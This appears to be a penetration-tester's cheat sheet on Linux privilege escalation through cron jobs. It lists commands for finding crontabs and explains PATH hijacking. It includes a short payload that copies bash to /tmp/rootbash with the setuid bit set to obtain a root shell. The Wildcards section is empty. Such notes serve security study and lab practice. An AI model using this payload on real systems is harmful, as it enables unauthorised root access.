#### Cronjobs location
- crontab -l
- ls -alh /var/spool/cron
- ls -alh /var/spool/crontabs
- ls -al /etc/ | grep cron
- ls -al /etc/cron*
- ls -alh -R /etc/cron*

#### PATH Environment Variable
```
crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job
```

#### PATH Environment Variable case study
```
for PATH=/home/user
create file in /home/user
content: 
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 chmod +s file.sh
 
 wait: watch -n 1 ls -l /tmp
```

#### Wildcards

